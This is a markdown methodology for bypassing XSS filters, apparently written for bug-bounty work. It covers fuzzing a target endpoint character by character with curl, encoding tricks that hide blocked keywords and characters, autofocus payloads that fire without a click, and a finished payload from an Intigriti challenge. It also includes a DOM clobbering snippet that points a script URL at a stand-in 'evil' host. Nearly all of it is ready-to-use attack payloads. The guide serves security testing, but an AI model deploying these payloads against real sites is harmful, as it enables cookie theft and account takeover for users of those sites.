# XSS Filter Bypass Methodology

## Phase 1: Character Fuzzing

Test each character individually against the filter:

```bash
# Characters to test (one per request)
CHARS='< > / = ! - _ @ # $ % ^ & * + ~ ` | \ { } [ ] : ? ( ) . , ; " '"'"

for char in $CHARS; do
  curl -s -b cookies.txt -X POST \
    -H "Content-Type: application/json" \
    -d "{\"field\":\"test${char}test\"}" \
    "$TARGET/api/endpoint"
done
```

Build a matrix: ALLOWED vs BLOCKED characters.

## Phase 2: Signature Detection

Test which patterns trigger signature-based blocking (separate from character filter):

```
# Tags
<script>  <svg>  <img>  <input>  <details>  <marquee>  <form>  <a>  <object>

# Event handlers
onload  onerror  onfocus  onmouseover  ontoggle  onstart  onblur  onchange

# Keywords
alert  confirm  prompt  eval  Function  constructor

# Attribute patterns
src=  href=javascript:  data=
```

## Phase 3: Bypass Construction

### Blocked parentheses `()`
Use tagged template literals:
```
alert`1`        → calls alert with ['1']
confirm`xss`    → calls confirm with ['xss']
```

### Blocked quotes `' "`
Use backticks for strings:
```
onfocus=alert`1`
```

### Blocked keyword "alert"
HTML entities (no semicolons needed in HTML5 numeric refs):
```
&#x61lert       → decodes to 'alert' in HTML attribute context
&#97lert        → decimal variant
```

Unicode escapes (only works if value goes through JS parser directly):
```
\u0061lert      → JS interprets as 'alert'
```

Dynamic construction:
```
top[`aler`+`t`]`1`
self[`aler`+`t`]`1`
window[`aler`+`t`]`1`
```

### Blocked dots `.`
```
document[`cookie`]          → instead of document.cookie
top[`aler`+`t`]`1`         → instead of top.alert(1)
```

### Blocked semicolons `;`
Single expression only — no statement chaining needed for alert PoC.

## Phase 4: Delivery Vector Selection

### Zero-click (auto-fire on innerHTML insertion)
| Vector | Requirement |
|--------|-------------|
| `<input onfocus=X autofocus>` | Best — fires immediately on insertion |
| `<textarea onfocus=X autofocus>` | Same as input |
| `<select onfocus=X autofocus>` | Same as input |
| `<body onload=X>` | Only if injecting into body context |

### One-click / interaction
| Vector | Trigger |
|--------|---------|
| `<div onmouseover=X>text</div>` | Hover |
| `<details ontoggle=X>click</details>` | Click to expand |
| `<marquee onstart=X>` | Auto-starts but unreliable in modern Chrome |

### Important: `<details open ontoggle=X>` does NOT auto-fire via innerHTML
The toggle event only fires on state change, not on initial insertion with `open` attribute.

## Phase 5: Final Payload Assembly

Template: `<TAG EVENT=ENCODED_FUNCTION AUTOFIRE>`

Example (from Intigriti May 2026):
- Blocked: `( ) . , ; ' "` + keywords `alert`, `script`, `src`, `onerror`, `onload`
- Payload: `<input onfocus=&#x61lert`1` autofocus>`
- Breakdown:
  - `<input>` — allowed tag
  - `onfocus` — allowed event handler
  - `&#x61lert` — HTML entity bypass for "alert"
  - `` `1` `` — tagged template literal (no parentheses)
  - `autofocus` — zero-click trigger

## DOM Clobbering (Alternative Vector)

When code checks `window.SomeConfig || defaults`:
```html
<!-- Via DOMPurify-sanitized content (if forms/inputs allowed) -->
<form id=SomeConfig><input name=enabled><input name=scriptUrl value=//evil>
```

Creates `window.SomeConfig.enabled` (truthy element) and `window.SomeConfig.scriptUrl`.

## SPA Source Analysis (Pre-requisite)

Before attempting XSS on SPAs, always:
1. Read main JS bundle — identify all `innerHTML` sinks (vs `textContent`)
2. Check which fields use DOMPurify vs raw insertion
3. Map data flow: API response → rendering function → DOM insertion method
4. Identify any dynamic script loaders (`document.createElement('script')`)
